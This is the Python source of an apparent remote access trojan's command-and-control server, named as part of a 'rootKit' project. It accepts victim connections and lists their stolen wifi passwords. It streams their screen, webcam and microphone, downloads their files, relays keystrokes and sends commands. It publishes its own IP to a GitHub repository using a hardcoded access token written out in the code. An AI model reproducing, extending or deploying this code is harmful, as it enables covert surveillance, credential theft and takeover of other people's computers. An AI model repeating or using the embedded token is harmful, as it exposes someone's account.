import socket, os, threading, requests, re, sys, keyboard, inspect, shutil
from os import name
from vidstream import StreamingServer
from pyaudio import PyAudio, paInt16
from time import sleep
from numpy import array
from math import *
from fct import clear as clearWindow
import fct
from colored import fg, bg, attr
from iteration_utilities import duplicates
from github import Github
from subprocess import call as supCall
from math import ceil
import tqdm
from datetime import date
pathDirFile = os.path.realpath(__file__)[:-len(os.path.basename(__file__))-1]+"/"
ATTR_colored = attr
githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"

class Setup():
    def __init__(self):
        self.array = {}
        self.version = ""
        self.file = "assets/setup.txt"
        firstLineFile = 7
        self.line = {"version": 1, "material speed": 3, "internet speed": 5}
        self.orderFile = ["cmd.txt", "ip.txt", "help.txt", "fileDownload", "log"]
        for index, file in enumerate(self.orderFile):
            self.line[file] = index+firstLineFile
        self.baseSetupFile = "version\n\nmaterial speed\nhigh\ninternet speed\nhigh\npath File"+"\n"*len(self.orderFile)
        try:
            with open(pathDirFile+self.file, "r"):
                pass
        except:
            with open(pathDirFile+self.file, "w") as file:
                self.createFile()
        self.changeValue()
    def createFile(self):
        with open(pathDirFile+self.file, "w") as file:
            file.write(self.baseSetupFile)
    def changeValue(self):
        with open(pathDirFile+self.file, "r") as file:
            sort = file.read().split("\n")
            if len(sort) != len(self.baseSetupFile.split("\n")):
                self.createFile()
                self.changeValue()
            elif sort[self.getLine("material speed")] not in ("low", "medium", "high", "xl-high"):
                self.changeConfig("high", self.getLine("material speed"))
            elif sort[self.getLine("internet speed")] not in ("low", "medium", "high", "xl-high"):
                self.changeConfig("high", self.getLine("internet speed"))
            else:
                if sort[self.getLine("material speed")] == "low":
                    self.setupMultipliersMaterial = 2
                elif sort[self.getLine("material speed")] == "medium":
                    self.setupMultipliersMaterial = 1.5
                elif sort[self.getLine("material speed")] == "high":
                    self.setupMultipliersMaterial = 1
                elif sort[self.getLine("material speed")] == "xl-high":
                    self.setupMultipliersMaterial = 0.5
                if sort[self.getLine("internet speed")] == "low":
                    self.setupConnexionSpeed = 2
                elif sort[self.getLine("internet speed")] == "medium":
                    self.setupConnexionSpeed = 1.5
                elif sort[self.getLine("internet speed")] == "high":
                    self.setupConnexionSpeed = 1
                elif sort[self.getLine("internet speed")] == "xl-high":
                    self.setupConnexionSpeed = 0.5
                for file in self.orderFile:
                    self.array[file] = sort[self.getLine(file)]
    def changeConfig(self, data, line, verif=None):
        # changeConfig("high", 1, ("low", "medium", "high", "xl-high")
        if verif != None and data not in verif:
            return None
        if line == None or len(self.baseSetupFile.split("\n")) < line:
            return None
        with open(pathDirFile+self.file, "r") as file:
            sort = file.read().split("\n")
            sort[line] = data
        with open(pathDirFile+self.file, "w") as file:
            file.write("\n".join(sort))
        self.changeValue()
        return True
    def getLine(self, data):
        if data not in self.line:
            return None
        return self.line[data]
    def getSpeedMaterialMultiplier(self):
        return self.setupMultipliersMaterial
    def getSpeedInternetMultiplier(self):
        return self.setupConnexionSpeed
    def getPathFile(self, file, onlyDir=False):
        if file in self.orderFile:
            if onlyDir:
                return self.array[file]
            return self.array[file]+file
        else:
            print(inspect.currentframe().f_lineno)
            return None
    def setPathFile(self, newPath, file, line):
        if len(newPath) > 0 and (newPath[-1] != "/" or newPath[-1] != "\\"):
            newPath = newPath+"/"
        oldPath = pathDirFile+self.getPathFile(file, onlyDir=True)
        if len(file.split(".")) == 1 and os.path.basename(pathDirFile[:-1]) in newPath:
            return None
        if file not in self.orderFile or self.changeConfig(newPath, line) == None:
            return None
        newPath = pathDirFile+newPath
        if not os.path.exists(newPath):
            os.makedirs(newPath)
        if os.path.exists(oldPath+file):
            shutil.move(oldPath+file, newPath+file)
            if not os.listdir(oldPath):
                os.rmdir(oldPath)
            return True
        return None
    def getVersion(self):
        return self.version
    def setVersion(self, version):
        self.version = version
    def getFileName(self):
        return self.orderFile

setup = Setup()
setup.setVersion(requests.get(f"{githubUrl}version").text.replace("\n", ""))

def getSelfIp(temp=-1):
    return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
def connected():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("www.google.com", 80))
        return True
    except Exception as e:
        print(e)
        return False
if getSelfIp() not in("192.168.249.97") and connected():
    # First create a Github instance:
    g = Github("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")
    # Then play with your Github objects:
    # for repo in g.get_user().get_repos():
    #     print(repo.name)
    repo = g.get_repo("N0SAFE/kit-local")
    try:
        contents = repo.get_contents("rootKit/ip")
        repo.delete_file(contents.path, "remove ip", contents.sha)
    except:
        pass
    repo.create_file("rootKit/ip", "create", getSelfIp())
    with open(pathDirFile+setup.getPathFile('ip.txt'), "w") as file:
        file.write(getSelfIp())
else:
    print("vous n'étes pas connecter")
    exit()

reset, sendAndReceive, mythreads, threadConnected, listenIp = ATTR_colored(0), [], [], [], False


class Microphone(threading.Thread):
    def __init__(self, ip, port):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.close = False
        self.RUN = False
    def run(self):
        self.RUN = True
        BREAK = False
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.ip, self.port))
                break
            except:
                if self.close:
                    break
                pass
        if not self.close:
            FORMAT, CHANNELS, RATE, CHUNK = paInt16, 1, 44100, 4096
            audio = PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
            try:
                while True:
                    data = self.s.recv(CHUNK)
                    try:
                        if data.decode() == "error":
                            break
                    except:
                        pass
                    stream.write(data)
            except:
                pass
            self.s.close()
            stream.close()
            audio.terminate()
        self.RUN = False
    def stopServer(self):
        if self.RUN == True:
            self.s.close()
            self.close = True
    def isRunning(self):
        return self.RUN

class myThread(threading.Thread):
    def __init__(self,ip,port, ID, con, init): 
        threading.Thread.__init__(self)
        # print(super.myThread())
        self.INIT = {}
        for i in range(0, len(init), 2):
            self.INIT[init[i]] = init[i+1]
        self.micIsAlive = False
        self.screen = False
        self.camera = False
        self.linked = False
        self.wifi = self.INIT['wifi']
        self.name = self.INIT['name']
        self.macAddress = self.INIT['mac']
        self.con = con
        self.ID = ID
        self.ip = ip 
        self.port = port 
        self.Stop = False
        # print (f"[+] Nouveau thread démarré pour {ip}:{str(port)}, {name}")
    def run(self):
        global ip
        loop = 5
        while True:
            if self.Stop:
                break
            if loop == 10:
                try:
                    getAll.getID().index(self.ID)
                except:
                    break
                try:
                    self.con.sendall("9".encode())
                except:
                    # print("error")
                    break
                loop = 0
            sleep(0.5)
            try:
                getAll.getID().index(self.ID)
            except:
                break
            loop+=1
        try:
            ip.pop(ip.index(self.getFullIp()))
        except:
            pass
        try:
            mythreads.pop(mythreads.index(self.currentthread))
        except:
            pass
        exit()
    def writeWifi(self):
        for line in self.wifi.split('-_-'):
            try:
                print(f"le mdp de {line.split(';-;')[0]} est {line.split(';-;')[1]}")
            except:
                pass
    def showInitInfo(self):
        return self.INIT
    def currentThread(self, thread):
        self.currentthread = thread
    def send(self, data):
        data.replace("9", "8+1")
        self.con.sendall(data.encode())
        sleep(0.05*setup.getSpeedInternetMultiplier())
    def timeout(self, time):
        self.con.settimeout(time)
    def getTimeout(self):
        return self.con.gettimeout()
    def receive(self, size=128, timeout=1, TYPE="str"):
        try:
            self.timeout(timeout)
            if TYPE == "str":
                return self.con.recv(size).decode()
            return self.con.recv(size)
        except:
            return None
    def stop(self):
        self.Stop = True
    def getCon(self):
        return self.con
    def getId(self):
        return self.ID
    def getPort(self):
        return self.port
    def getIp(self):
        return self.ip
    def getCurrentThread(self):
        return self.currentthread
    def getName(self):
        return self.name
    def getFullIp(self):
        return f"{self.ip}:{self.port}"
    def testIfSameIp(self, IP):
        IP = IP.split(':')
        if len(IP) > 1:
            return self.ip == IP[0] and str(self.port) == IP[1]
        return self.ip == IP[0]
    def isLink(self):
        return self.linked
    def link(self):
        self.linked = True
    def unlink(self):
        self.linked = False
    def screenStart(self, port):
        if not self.screen:
            self.screenPort = port
            self.scrn = (StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
            t = threading.Thread(target=self.scrn.start_server)
            t.daemon=True
            t.start()
        self.screen = True
    def screenStop(self):
        self.scrn.stop_server()
        self.screen = False
    def getPortScreen(self):
        return self.screenPort
    def screenIsAlive(self):
        return self.screen
    def cameraStart(self, port):
        if not self.camera:
            self.cameraPort = port
            self.cam = (StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
            t = threading.Thread(target=self.cam.start_server)
            t.daemon=True
            t.start()
        self.camera = True
    def cameraStop(self):
        self.cam.stop_server()
        self.camera = False
    def getPortCamera(self):
        return self.cameraPort
    def cameraIsAlive(self):
        return self.camera
    def micStart(self, port):
        try:
            self.micIsAlive = self.mic.isRunning()
            # print(self.micIsAlive)
        except:
            pass
        if not self.micIsAlive:
            self.micPort = port
            self.mic = Microphone(self.ip, port)
            self.mic.daemon = True
            self.mic.start()
    def micLives(self):
        return self.micIsAlive
    def micStop(self):
        self.mic.stopServer()
    def getPortMic(self):
        return self.micPort
    

class getAll():
    def getID(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getId())
        return ret
    def getCon(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getCon())
        return ret
    def getCurrentThreads(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getCurrentThread())
        return ret
    def getName(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getName())
        return ret
    def getAllByName(name, MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            if thread.getName() == name:
                ret.append(thread.getName())
                ret.append(thread.getFullIp())
        return ret
class getConnected():
    def getID():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getId())
        return ret
    def getCon():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getCon())
        return ret
    def getCurrentThreads():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getCurrentThread())
        return ret
    def getName():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getName())
        return ret

# Programme du serveur TCP

port, ipHost = 9999, getSelfIp()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
s.bind((ipHost, port))

def MainThread():
    global mythreads
    ID=0
    mainThread = threading.currentThread()
    # print(mainThread)
    while getattr(mainThread, "do_run", True):
        try:
            ID+=1
            s.settimeout(1*setup.getSpeedInternetMultiplier()*setup.getSpeedMaterialMultiplier())
            s.listen(1) 
            # print("Serveur: en attente de connexions des clients TCP ...")
            (con, (ip,port)) = s.accept()
            OK = False
            init = con.recv(4096*4).decode()
            mythread = myThread(ip, port, ID, con, init.split(':'))
            mythread.currentThread(mythread)
            mythreads.append(mythread)
            mythread.daemon = True
            mythread.start()
        except:
            pass

mainThread = threading.Thread(target=MainThread)
mainThread.daemon = True
mainThread.start()

def TrueFalseColor(bool, returnWithColor = None):
    if not returnWithColor:
        if bool:
            return fg(2)+str(bool)+reset
        return fg(1)+str(bool)+reset
    if bool:
        return fg(2)+returnWithColor+reset
    return fg(1)+returnWithColor+reset
def getByGithub(url):
        return requests.get(f"{url}").text
def writeMiddle(data):
    return f"{int(ceil(int(fct.terminal_size()[0])/2)-ceil(len(stopSpaceError(data))/2))*' '+stopSpaceError(data)}"
def writeFloat(left="", right="", leftLen=None, rightLen=None):
    if type(leftLen) == str:
        leftLen = len(leftLen)
    if type(rightLen) == str:
        rightLen = len(rightLen)
    if not leftLen:
        leftLen = len(left)
    if not rightLen:
        rightLen = len(right)
    return f"{left}{(int(fct.terminal_size()[0])-leftLen-rightLen)*' '}{right}"
def initHelp(file):
    help = {}
    with open(file, 'r') as file:
        for sep in file.read().split('__//__'):
            first = True
            stop, sort = True, ''
            for line in sep.split('\n'):
                if line and stop:
                    temp, stop = stopSpaceError(line), False
                if not stop:
                    if first:
                        sort += f"{fg(40)}{ATTR_colored(1)}{writeMiddle(line)}{reset}\n"
                        first = False
                    else:
                        sort += writeMiddle(line)+'\n'
            help[temp] = sort
    return help
def HELP(nameDict=None):
    if nameDict:
        return initHelp(pathDirFile+setup.getPathFile('help.txt'))[nameDict]
    return initHelp(pathDirFile+setup.getPathFile('help.txt'))
def send(data, THREAD=None):
    global addvar, run
    thread = getConnected.getCurrentThreads()
    if not THREAD:
        THREAD=thread
    if Send != False:
        for thread in THREAD:
            try:
                if data.split()[0] in ("screen"):
                    if thread.screenIsAlive():
                        thread.send(f"screen {thread.getPortScreen()}")
                elif data.split()[0] in ("camera"):
                    print(thread.cameraIsAlive())
                    if thread.cameraIsAlive():
                        thread.send(f"camera {thread.getPortCamera()}")
                elif data.split()[0] in ("microphone"):
                    # print(thread.micLives())
                    if not thread.micLives():
                        # print(f'starting mic on {thread.getPortMic()} {thread.getIp()}')
                        thread.send(f"microphone {thread.getPortMic()} {thread.getIp()}")
                    else:
                        micStop(reload=True)
                        thread.send(f"microphone {thread.getPortMic()} {thread.getIp()}")
                else:
                    thread.send(data)
                # print(f'send {data} to {thread.getCon()}')
                if data in ("die", "left"):
                    thread.stop()
            except:
                print("connexion lost")
                run = False
    else:
        addvar += data+"µ"

def threadingSendAndReceive(dataToSend, ip, port, thread):
    rest = True
    try:
        thread.send(dataToSend)
    except Exception as e:
        print(f'connexion lost on {ip}:{port}')
        rest=False
    if rest:
        try:
            thread.getCon().settimeout(4*setup.getSpeedInternetMultiplier())
            print(thread.receive(size=64000))
        except:
            print(f'no return in {ip}:{port}')
        
def runThreadingSendAndReceive(data):
    loop = 0
    # print(SocketCo)
    for thread in getConnected.getCurrentThreads():
        t = threading.Thread(target=threadingSendAndReceive, args=(data, thread.getIp(), thread.getPort(), thread,))
        sendAndReceive.append(t)
        t.daemon = True
        t.start()
        loop+=1
    sleep(5*setup.getSpeedInternetMultiplier())

def testIfIpTrue(data, total=False):
    if total == False:
        for i in range(len(data.split('.'))):
            if int(data.split('.')[i]) > 255:
                return False
        return True
    if total != False:
        return testIfIpTrue(data) == True and len(data.split('.')) == 4
def stopSpaceError(data):
    return " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
def clear():
    clearWindow()

def restart(timeout=2):
    global mainThread
    # print(mainThread)
    # print(mythreads)
    mainThread.do_run = False
    for thread in getAll.getCurrentThreads():
        try:
            thread.send('left')
        except:
            pass
    sleep(timeout*setup.getSpeedInternetMultiplier())
    mainThread = threading.Thread(target=MainThread)
    mainThread.daemon = True
    mainThread.start()
    clear()

def testEmptyLine(nameFile):
    numberLine, file, ligne, numbsup, lignesup = (len((open(nameFile,'r')).readlines())), (open(nameFile, 'r')), 0, 0, []
    for i in range(numberLine):
        readln, ligne = file.readline(), ligne + 1 
        if readln == "\n":
            lignesup.append(ligne)
            numbsup += 1
    lignesup.sort(reverse=True)
    for i in range(numbsup):
        supLine(nameFile, lignesup[i])
    file.close()

def supLine(filename, line_to_delete):
    initial_line = 1
    file_lines = {}
    with open(filename) as f:
        content = f.readlines()
    for line in content:
        file_lines[initial_line] = line.strip()
        initial_line += 1
    f = open(filename, "w")
    for line_number, line_content in file_lines.items():
        if line_number != line_to_delete:
            f.write('{}\n'.format(line_content))
        else:
            print(f'{line_content} has been successfuly delete')
    f.close()
    
def printFileCmd():
    filename = pathDirFile+setup
    testEmptyLine(filename)
    with open(pathDirFile+filename) as fp:
        sort = fp.read()
        if sort:
            sort = sort.split('\n')
            loop = 0
            for line in sort:
                if line:
                    loop += 1
                    print(f'line {loop}: {line}')
        else:
            print("no cmd register")
            print("to register a cmd write register (and enter your cmd here)")

def inputcolor(color=255, attribut=None, content="", preset=None):
    numPreset=preset
    preset=[[127,1,content], [205,1,content]]
    if numPreset != None and numPreset > 0:
        numPreset-=1
        ret = inputcolor(color=preset[numPreset][0], attribut=preset[numPreset][1], content=preset[numPreset][2])
        return ret
    else:
        return input(fg(color)+ATTR_colored(attribut)+content+reset)

def retLineCmd(filename, numberline):
    with open(filename) as fp:
       line, cnt = fp.readline(), 1
       while line:
            if cnt == numberline:
                return("{}".format(line.strip()))
            line = fp.readline()
            cnt += 1
def printSocketCo():
    mainThread = threading.currentThread()
    while getattr(mainThread, "do_run", True):
        clear()
        print(writeFloat('pour sortir appuyer sur entrer', 'github: '+TrueFalseColor(getSelfIp()==getByGithub(f"{githubUrl}ip").replace("\n", "")), rightLen = len('github: '+str(getSelfIp()==getByGithub(f"{githubUrl}ip").replace("\n", "")))))
        print()
        print()
        CMD.command('list')
        sleep(3*setup.getSpeedMaterialMultiplier())
def testin(data, *cmd):
    for command in cmd:
        if data == command:
            return True
    return False
def displayContinueSocket(stop):
    DICT = {}
    for thread in getConnected.getCurrentThreads():
        DICT[thread.getCon()] = [thread.getName(), ""]
    actuel = ""
    pause = False
    while True:
        for thread in getConnected.getCurrentThreads():
            con = thread.getCon()
            try:
                if not pause:
                    receive = thread.receive(size=5, timeout=0.01*setup.getSpeedInternetMultiplier())
                    if receive:
                        delete = 0
                        if receive == "x/332":
                            DICT[con] = [DICT[con][0], DICT[con][1][:-1]]
                            delete = 1
                        elif receive == "w/145":
                            DICT[con] = [DICT[con][0], ""]
                            print()
                        else:
                            DICT[con] = [DICT[con][0], DICT[con][1]+receive]
                        if DICT[con][0] != actuel and actuel != "":
                            print()
                        sys.stdout.flush() # Pour raffraichir l'affichage
                        sys.stdout.write(chr(13)) # Retour chariot
                        sys.stdout.write(' '*(len(DICT[con][0]+": "+DICT[con][1])+delete)) # Efface la ligne. Comprendre 100 > 99 = 1 caractere de moins
                        sys.stdout.write(chr(13))
                        sys.stdout.write(DICT[con][0]+": "+DICT[con][1])
                        actuel = DICT[con][0]
            except Exception as e:
                pass
        if stop():
            break
    print()
def recieveAndWritteFile(thread): 
    # ! continuer ici pour le keylogger
    with open(pathDirFile+"log/"+thread.getName()+"_log.txt", "w"):
        pass
    with open(pathDirFile+"log/"+thread.getName()+"_log.txt", 'a') as file:
        while True:
            recv = thread.receive(size = 128)
            if recv == None or len(recv) < 3:
                break
            elif recv[-3:] == "end":
                file.write(recv[:-3])
                break
            else:
                file.write(recv)
def receiveFile(thread):
    SEPARATOR = "<SEPARATOR>"
    BUFFER_SIZE = 4096
    recv = thread.receive(size = BUFFER_SIZE)
    filename, filesize = recv.split(SEPARATOR)
    filename = os.path.basename(filename)
    filesize = int(filesize)
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    try:
        os.mkdir(setup.getPathFile("fileDownload", onlyDir=True))
    except:
        pass
    try:
        os.mkdir(setup.getPathFile("fileDownload", onlyDir=True)+"/"+thread.getName())
    except:
        pass
    thread.send("g")
    with open(setup.getPathFile("fileDownload")+"/"+thread.getName()+"/"+date.today().strftime("%b-%d-%Y")+"____"+filename, "wb") as f:
        while True:
            # read 1024 bytes from the socket (receive)
            bytes_read = thread.receive(size = BUFFER_SIZE, TYPE = "byte")
            if not bytes_read:
                # nothing is received
                # file transmitting is done
                break
            # write to the file the bytes we just received
            f.write(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
        
def addToString(data, length, contentToAdd=" "):
    if len(data) < length:
        return data+contentToAdd*(length-len(data))
    return data

# ! main

class Command():
    def keylogger(self):
        # save all logkey in a save.txt file
        from pynput.keyboard import Key, Listener
        def press(key):
            save(str(key).replace("'", ""))
        def save(key):
            global QUEUKeylogger
            QUEUKeylogger.append(addToString(key, 6))
        def release(key):
            global stopKeylogger
            if key == Key.esc:
                stopKeylogger = True
                return False
        with Listener(on_press=press, on_release=release) as listener:
            listener.join()

    def QueuKeyloggerEvent(self, thread):
        print("vos frappe vont etre envoyer en temp reel")
        global QUEUKeylogger, stopKeylogger
        QUEUKeylogger = []
        stopKeylogger = False
        threadingKeylogger = threading.Thread(target=self.keylogger)
        threadingKeylogger.daemon = True
        threadingKeylogger.start()
        sleep(0.4)
        try:
            while True:
                sleep(0.001)
                if QUEUKeylogger:
                    thread.send("".join(QUEUKeylogger[:5]))
                    QUEUKeylogger = QUEUKeylogger[5:]
                if stopKeylogger and not QUEUKeylogger:
                    thread.send("end")
                    break
        except Exception as e:
            print(e)
            thread.send("end")

    def moveInFile(self, thread):
        # ! can get in argument just one thread
        clear()
        print(writeFloat(f'{fg(205)+ATTR_colored(1)}move in file{reset}', thread.getName(), leftLen = len("move in file"), rightLen = thread.getName()))
        skip = False
        thread.send("move into file")
        while True:
            try:
                if not skip:
                    add = ""
                    while True:
                        recv = thread.receive()
                        if recv == None or len(recv) < 3:
                            break
                        elif recv[-3:] == "end":
                            add += (recv[:-3])
                            break
                        else:
                            add += (recv)
                    for index, line in enumerate(add.split("\n")):
                        if index == len(add.split("\n"))-1 and len(add.split("\n")) != 1:
                            print()
                            print(line)
                            break
                        if index%2 == 1:
                            print(writeFloat(left=FLOAT, right=line))
                        else:
                            FLOAT = line
                    print()
                skip = False
                data = inputcolor(preset=2, content="dir of "+thread.getName()+">")
                data = data.lower()
                data = stopSpaceError(data)
                datalist = data.split()
                if not data:
                    skip = True
                elif data == "display":
                    thread.send("displayListFile")
                elif testin(data, "stop", "quit"):
                    break
                elif testin(data, "die"):
                    self.sendData("die")
                    break
                elif len(datalist) == 1:
                    thread.send("CdSeeDir "+data)
                elif testin(datalist[0], "dl"):
                    thread.send("dlFile "+datalist[1])
                    receiveFile(thread)
                else:
                    print("error command")
            except Exception as e:
                print(e)
                

    def setupCommand(self):
        clear()
        version = setup.getVersion()
        print(writeFloat(f'{fg(5)+ATTR_colored(1)}setup{reset}', "version: "+TrueFalseColor(version != "404: Not Found", version), leftLen = len("setup"), rightLen = "version: "+version))
        while True:
            data = input(fg(4)+ATTR_colored(1)+">"+reset)
            dataNormal = data.split()
            data = data.lower()
            data = stopSpaceError(data)
            datalist = data.split()
            try:
                if testin(data, "stop", "quit"):
                    break
                elif testin(data, "help"):
                    print(HELP("setup commands"))
                elif testin(datalist[0], "changepath"):
                    if dataNormal[1] in setup.getFileName():
                        if len(datalist) == 2:
                            print("test")
                            datalist.append("")
                        print("successful") if setup.setPathFile(datalist[2], dataNormal[1], setup.getLine(dataNormal[1])) == True else print("error")
                    else:
                        print("file not found")
                elif testin(datalist[0], "changeconfig"):
                    if datalist[1] == "internet":
                        print("successful") if setup.changeConfig(datalist[2], setup.getLine("internet speed"), ("low", "medium", "high", "xl-high")) != None else print("not a good parameter")
                    elif datalist[1] == "material":
                        print("successful") if setup.changeConfig(datalist[2], setup.getLine("material speed"), ("low", "medium", "high", "xl-high")) != None else print("not a good parameter")
            except Exception as e:
                print(e)
                print("error")
        clear()
        
    def registerCmdAcces(self):
        def displayHelp():
            clear()
            print(fg(40)+ATTR_colored(1)+writeMiddle("your in the cmd space")+reset)
            print()
            try:
                print(HELP('custom cmd command'))
            except:
                print('aucune aide ici...')
        displayHelp()
        while True:
            data = inputcolor(preset=1, content=">")
            data = stopSpaceError(data)
            datalist = data.split()
            try:
                if testin(data, "stop", "quit"):
                    break
                elif testin(datalist[0], "register", "enregistre"):
                    customcmd = open(pathDirFile+setup.getPathFile("cmd.txt"), "a")
                    temp = "\n"+" ".join(datalist[1:len(datalist)])
                    customcmd.write(temp)
                    customcmd.close()
                    print('the command '+temp.replace('\n', '')+' as been create successfuly')
                elif testin(data, "help", "clear", "cls"):
                    displayHelp()
                elif testin(data, "cmdList", "commandlist", "listcmd", "listcommand", "list"):
                    try:
                        printFileCmd()
                    except:
                        print("no cmd register")
                        print("to register a cmd write register (and enter your cmd here)")
                elif testin(datalist[0], "sup", "del"):
                    if len(datalist) > 2 and datalist[2].isdigit() == True:
                        datalist[2] = int(datalist[2])
                        supLine(pathDirFile+setup.getPathFile("cmd.txt"), datalist[2])
                    elif len(datalist) > 1 and datalist[1].isdigit() == True:
                        datalist[1] = int(datalist[1])
                        supLine(pathDirFile+setup.getPathFile("cmd.txt"), datalist[1])
                    else:
                        print("no int write")
                else:
                    print("Error")
            except:
                pass
        clear()

    def command(self, commandToExecute):
        commandToExecute = stopSpaceError(commandToExecute)
        commandToExecuteList = commandToExecute.split()
        global ipToConnect, ip, run, reloading, progrun, affiche, listenIp
        ip, error = [], False
        try:
            if testin(commandToExecuteList[0], "connect", "connexion", "connecter", "co"):
                if len(commandToExecuteList) > 1:
                    if testin(commandToExecuteList[1], 'all'):
                        for thread in mythreads:
                            ip.append(f"{thread.getIp()}:{thread.getPort()}")
                            affiche.append(f"{thread.getIp()}:{thread.getPort()}")
                    else:
                        commandToExecuteList.pop(0)
                        for IP in commandToExecuteList:
                            listName = getAll.getAllByName(IP)
                            if listName:
                                ip.append(listName[1])
                                affiche.append(listName[0])
                            else:
                                OK = True
                                ipsplit = IP.split(":")
                                if len(ipsplit) > 1:
                                    for i in IP.split(":"):
                                        i = "".join(i.split("."))
                                        if not i.isdigit():
                                            OK = False
                                    if OK:
                                        ip.append(IP)
                                        affiche.append(IP)
                                    else:
                                        error = True
                                else:
                                    if "".join(IP.split(".")).isdigit():
                                        ip.append(IP)
                                        affiche.append(IP)
                                    else:
                                        error = True
                else:
                    print("[ERROR]: no ip requested")
                    self.command(inputcolor(preset=1, content=">"))
                if error:
                    print("ip error")
                    run = False
            elif testin(commandToExecute, 'ip'):
                # afficher l'ip du server
                print(ipHost)
            elif testin(commandToExecute, "stop"):
                # stop le programme
                global progrun
                progrun = False
            elif testin(commandToExecute, "wifi"):
                # affiche les wifi et mdp des machine connecter
                for thread in getAll.getCurrentThreads():
                    print(f'list wifi de {thread.getName()}')
                    print()
                    thread.writeWifi()
            elif testin(commandToExecute, "listenIp", "listenip", 'listen'):
                t = threading.Thread(target=printSocketCo)
                t.start()
                input()
                t.do_run = False
                clear()
            elif testin(commandToExecute, "help", "aide"):
                try:
                    print(fg(40)+ATTR_colored(1)+int(fct.terminal_size()[0])*"_"+"\n"+reset+HELP('local command'))
                except:
                    print('aucune aide ici...')
                self.command(inputcolor(preset=1, content=">"))
            elif testin(commandToExecute, 'reloadCo', 'restartCo'):
                restart()
            elif testin(commandToExecute, 'stopCo'):
                for thread in getAll.getCurrentThreads():
                    try:
                        thread.send('die')
                        mythreads.pop(mythreads.index(thread))
                    except Exception as e:
                        print(e)
                        pass
            elif testin(commandToExecute, 'setting', 'param', 'parameter', "setup"):
                self.setupCommand()
            elif testin(commandToExecute, "clear", "cleared", "cls", "restart"):
                print('cleared')
                clear()
            elif testin(commandToExecute, "reload", "reloading"):
                os.system(os.path.basename(__file__))
                run, reloading, progrun=False, True, False
            elif testin(commandToExecute, "list"):
                OK = False
                for thread in getAll.getCurrentThreads():
                    OK = True
                    print(f"{fg(40)}{ATTR_colored(1)}{thread.getName()}  --->  {thread.getFullIp()}{reset}")
                if not OK:
                    print(f'{fg(1)}{ATTR_colored(1)}aucune connexion active...{reset}')
            elif testin(commandToExecute, "command"):
                self.registerCmdAcces()
            else:
                print("Error")
                self.command(inputcolor(preset=1, content=">"))
        except Exception as e:
            print(e)
            self.command(inputcolor(preset=1, content=">"))

    def sendData(self, data, RETURN=False):
        global run, Send, mythreads, runCommand, pause
        datalist = data.split()
        numCmd = data.split("µ+µ")
        if len(numCmd) > 1:
            data = "fastcontrol "+data
            datalist = data.split()
        OK = True
        if not data:
            OK = False
        if OK:
            try:
                if testin(data, "die", "kill"):
                    try:
                        send("die")
                    except:
                        pass
                    run = False
                elif testin(datalist[0], "seeDir"):
                    if len(datalist) == 2:
                        GOOD = False
                        for thread in getConnected.getCurrentThreads():
                            if (thread.getName() == datalist[1]) or (thread.getIp() == datalist[1]) or (thread.getFullIp() == datalist[1]):
                                self.moveInFile(thread)
                                GOOD = True
                                break
                        if not GOOD:
                            print("connexion not found")
                    else:
                        print("to many arguments")
                elif testin(data, 'wifi', 'wf'):
                    for thread in getConnected.getCurrentThreads():
                        print(f'list wifi de {thread.getName()}')
                        print()
                        thread.writeWifi()
                elif testin(data, "list", 'lst'):
                    OK = False
                    ret = []
                    for thread in getConnected.getCurrentThreads():
                        if RETURN:
                            ret.append(f"{thread.getName()}  --->  {thread.getFullIp()}{reset}")
                        else:
                            print(f"{fg(40)}{ATTR_colored(1)}{thread.getName()}  --->  {thread.getFullIp()}{reset}")
                        OK = True
                    if not OK:
                        print(f'{fg(1)}{ATTR_colored(1)}aucune connexion active...{reset}')
                    if RETURN:
                        return ret
                elif testin(data, "help", "aide"):
                    try:
                        print(fg(40)+ATTR_colored(1)+int(fct.terminal_size()[0])*"_"+"\n"+reset+HELP('sending command'))
                    except:
                        print('aucune aide ici...')
                elif testin(datalist[0], "severalcmd"):
                    send(data)
                elif testin(datalist[0], "wallpaper"):
                    send(data)
                elif testin(data, "command"):
                    self.registerCmdAcces()
                elif testin(datalist[0], "command") and testin(datalist[1], "list") or testin(data, "cmdlist", "listcmd"):
                    try:
                        printFileCmd()
                    except:
                        print("no cmd register")
                        print("to register a cmd write register (and enter your cmd here)")
                elif testin(datalist[0], "command"):
                    if len(datalist) > 2 and datalist[2].isdigit() == True:
                        datalist[2] = int(datalist[2])
                        self.sendData(retLineCmd(pathDirFile+setup.getPathFile("cmd.txt"), datalist[2]))
                    elif len(datalist) > 1 and datalist[1].isdigit() == True:
                        datalist[1] = int(datalist[1])
                        self.sendData(retLineCmd(pathDirFile+setup.getPathFile("cmd.txt"), datalist[1]))
                    else:
                        if data == 'command':
                            runCommand = True
                            self.registerCmdAcces("help")
                            while runCommand == True:
                                self.registerCmdAcces(inputcolor(preset=1, content=">"))
                            clear()
                        else:
                            print("no int write")
                elif testin(data, "left", "quit", "restart", "stop"):
                    try:
                        send("left")
                    except:
                        pass
                    run = False
